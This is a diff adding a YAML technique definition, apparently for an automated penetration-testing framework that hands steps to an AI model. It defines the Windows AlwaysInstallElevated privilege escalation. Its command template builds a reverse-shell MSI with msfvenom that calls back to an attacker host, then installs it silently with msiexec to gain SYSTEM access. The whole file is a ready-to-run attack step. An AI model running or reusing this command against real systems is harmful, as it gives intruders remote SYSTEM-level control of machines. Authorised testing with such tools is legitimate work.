@@ -1,0 +1,16 @@
+name: always_install_elevated
+category: privesc
+description: AlwaysInstallElevated MSI privesc
+preconditions:
+  - os==windows
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f msi -o evil.msi && msiexec /quiet /qn /i evil.msi"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "If both HKLM and HKCU AlwaysInstallElevated registry keys are set, any user can install MSI as SYSTEM. Generate malicious MSI with msfvenom."
